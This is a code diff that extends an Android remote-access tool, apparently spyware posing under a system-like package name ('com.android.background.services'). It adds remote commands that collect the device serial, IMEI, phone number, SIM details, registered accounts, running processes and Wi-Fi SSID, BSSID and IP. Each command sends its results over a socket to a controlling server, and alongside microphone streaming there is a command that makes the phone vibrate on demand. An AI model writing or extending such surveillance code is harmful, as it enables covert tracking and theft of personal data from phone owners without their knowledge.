@@ -2,9 +2,11 @@ package com.android.background.services;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.ActivityManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -13,10 +15,16 @@ import android.media.AudioFormat;
 import android.media.AudioRecord;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Looper;
+import android.os.StatFs;
+import android.os.Vibrator;
 import android.provider.MediaStore;
+import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
 
@@ -165,6 +173,24 @@ public class ConnectionManager {
                                 break;
                             case "x0000listenMic":
                                 x0000listenMic();
+                                break;
+                            case "x0000deviceInfo":
+                                x0000deviceInfo();
+                                break;
+                            case "x0000accounts":
+                                x0000accounts();
+                                break;
+                            case "x0000runningApps":
+                                x0000runningApps();
+                                break;
+                            case "x0000wifiInfo":
+                                x0000wifiInfo();
+                                break;
+                            case "x0000vibrate":
+                                x0000vibrate(data.optInt("ms", 500));
+                                break;
+                            case "x0000battery":
+                                x0000battery();
                                 break;
                         }
                     } catch (Exception e) {
@@ -608,5 +634,224 @@ public class ConnectionManager {
             micStreamRecord.release();
             micStreamRecord = null;
         }
+    }
+
+    // ---------------------------------------------------------------------
+    // Extended device data (payload automation adds these orders)
+    // ---------------------------------------------------------------------
+
+    /** Rich device fingerprint: model, OS, battery, SIM, storage, memory, screen. */
+    private static void x0000deviceInfo() throws JSONException {
+        JSONObject o = new JSONObject();
+        o.put("model", Build.MODEL);
+        o.put("manufacturer", Build.MANUFACTURER);
+        o.put("brand", Build.BRAND);
+        o.put("device", Build.DEVICE);
+        o.put("android", Build.VERSION.RELEASE);
+        o.put("sdk", Build.VERSION.SDK_INT);
+        o.put("serial", getSerial());
+        o.put("battery", batteryJson());
+        o.put("memory", memoryJson());
+        o.put("storage", storageJson());
+        o.put("screen", screenJson());
+        o.put("sim", simJson());
+        ioSocket.emit("x0000deviceInfo", o);
+    }
+
+    private static void x0000battery() throws JSONException {
+        ioSocket.emit("x0000battery", batteryJson());
+    }
+
+    private static JSONObject batteryJson() throws JSONException {
+        JSONObject o = new JSONObject();
+        try {
+            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+            if (bm == null) { o.put("error", "no battery service"); return o; }
+            int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+            int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
+            o.put("level", level);
+            o.put("status", status);      // 2=charging 3=discharging 5=full
+            o.put("charging", status == BatteryManager.BATTERY_STATUS_CHARGING
+                    || status == BatteryManager.BATTERY_STATUS_FULL);
+            // temperature is not a public BatteryManager property: read it
+            // from the sticky battery-changed broadcast instead.
+            Intent bat = context.registerReceiver(null,
+                    new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (bat != null && bat.hasExtra(BatteryManager.EXTRA_TEMPERATURE)) {
+                o.put("temperature", bat.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) / 10.0);
+            }
+        } catch (Exception e) {
+            o.put("error", e.getMessage());
+        }
+        return o;
+    }
+
+    private static JSONObject memoryJson() throws JSONException {
+        JSONObject o = new JSONObject();
+        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+        if (am == null) { o.put("error", "no activity service"); return o; }
+        ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
+        am.getMemoryInfo(mi);
+        o.put("totalMb", mi.totalMem / (1024 * 1024));
+        o.put("availMb", mi.availMem / (1024 * 1024));
+        o.put("lowMemory", mi.lowMemory);
+        return o;
+    }
+
+    private static JSONObject storageJson() throws JSONException {
+        JSONObject o = new JSONObject();
+        try {
+            StatFs stat = new StatFs(Environment.getDataDirectory().getAbsolutePath());
+            long total = stat.getTotalBytes();
+            long avail = stat.getAvailableBytes();
+            o.put("totalGb", Math.round(total / (1024.0 * 1024 * 1024) * 10) / 10.0);
+            o.put("availGb", Math.round(avail / (1024.0 * 1024 * 1024) * 10) / 10.0);
+        } catch (Exception e) {
+            o.put("error", e.getMessage());
+        }
+        return o;
+    }
+
+    private static JSONObject screenJson() throws JSONException {
+        JSONObject o = new JSONObject();
+        android.util.DisplayMetrics dm = context.getResources().getDisplayMetrics();
+        o.put("width", dm.widthPixels);
+        o.put("height", dm.heightPixels);
+        o.put("density", dm.densityDpi);
+        return o;
+    }
+
+    private static JSONObject simJson() throws JSONException {
+        JSONObject o = new JSONObject();
+        try {
+            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm == null) { o.put("error", "no telephony service"); return o; }
+            o.put("simState", tm.getSimState());
+            o.put("networkOperator", tm.getNetworkOperatorName());
+            if (checkPerm(Manifest.permission.READ_PHONE_STATE)) {
+                o.put("phoneNumber", tm.getLine1Number());
+                o.put("imei", tm.getDeviceId());
+            }
+            o.put("networkType", tm.getNetworkType());
+        } catch (Exception e) {
+            o.put("error", e.getMessage());
+        }
+        return o;
+    }
+
+    private static String getSerial() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                return Build.getSerial();
+            }
+            return Build.SERIAL;
+        } catch (Exception e) {
+            return "restricted";
+        }
+    }
+
+    /** Accounts registered on the device (needs GET_ACCOUNTS). */
+    private static void x0000accounts() throws JSONException {
+        JSONObject out = new JSONObject();
+        JSONArray list = new JSONArray();
+        try {
+            android.accounts.AccountManager am =
+                    (android.accounts.AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
+            if (am != null && checkPerm(Manifest.permission.GET_ACCOUNTS)) {
+                for (android.accounts.Account a : am.getAccounts()) {
+                    JSONObject o = new JSONObject();
+                    o.put("name", a.name);
+                    o.put("type", a.type);
+                    list.put(o);
+                }
+            } else {
+                out.put("error", "GET_ACCOUNTS permission missing");
+            }
+        } catch (Exception e) {
+            out.put("error", e.getMessage());
+        }
+        out.put("count", list.length());
+        out.put("accounts", list);
+        ioSocket.emit("x0000accounts", out);
+    }
+
+    /** Currently running processes + foreground task (needs no extra perm). */
+    private static void x0000runningApps() throws JSONException {
+        JSONObject out = new JSONObject();
+        JSONArray list = new JSONArray();
+        try {
+            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+            if (am != null) {
+                for (ActivityManager.RunningAppProcessInfo p : am.getRunningAppProcesses()) {
+                    JSONObject o = new JSONObject();
+                    o.put("processName", p.processName);
+                    o.put("pid", p.pid);
+                    o.put("importance", p.importance);
+                    list.put(o);
+                }
+            }
+        } catch (Exception e) {
+            out.put("error", e.getMessage());
+        }
+        out.put("count", list.length());
+        out.put("processes", list);
+        ioSocket.emit("x0000runningApps", out);
+    }
+
+    /** Current WiFi state: ssid / signal / link speed / ip. */
+    private static void x0000wifiInfo() throws JSONException {
+        JSONObject o = new JSONObject();
+        try {
+            WifiManager wm = (WifiManager) context.getApplicationContext()
+                    .getSystemService(Context.WIFI_SERVICE);
+            if (wm == null) { o.put("error", "no wifi service"); ioSocket.emit("x0000wifiInfo", o); return; }
+            o.put("enabled", wm.isWifiEnabled());
+            WifiInfo info = wm.getConnectionInfo();
+            if (info != null) {
+                String ssid = info.getSSID();
+                o.put("ssid", ssid != null ? ssid.replace("\"", "") : null);
+                o.put("bssid", info.getBSSID());
+                o.put("rssi", info.getRssi());
+                o.put("linkSpeedMbps", info.getLinkSpeed());
+                int ip = info.getIpAddress();
+                o.put("ip", (ip & 0xff) + "." + ((ip >> 8) & 0xff) + "."
+                        + ((ip >> 16) & 0xff) + "." + ((ip >> 24) & 0xff));
+            }
+        } catch (Exception e) {
+            o.put("error", e.getMessage());
+        }
+        ioSocket.emit("x0000wifiInfo", o);
+    }
+
+    /** Buzz the device for {@code ms} milliseconds. */
+    private static void x0000vibrate(long ms) throws JSONException {
+        JSONObject o = new JSONObject();
+        try {
+            Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null && v.hasVibrator()) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(android.os.VibrationEffect.createOneShot(ms,
+                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    @SuppressWarnings("deprecation")
+                    long[] pattern = { 0, ms };
+                    v.vibrate(pattern, -1);
+                }
+                o.put("status", true);
+                o.put("ms", ms);
+            } else {
+                o.put("status", false);
+                o.put("message", "no vibrator");
+            }
+        } catch (Exception e) {
+            o.put("status", false);
+            o.put("message", e.getMessage());
+        }
+        ioSocket.emit("x0000vibrate", o);
+    }
+
+    private static boolean checkPerm(String perm) {
+        return ContextCompat.checkSelfPermission(context, perm)
+                == PackageManager.PERMISSION_GRANTED;
     }
 }
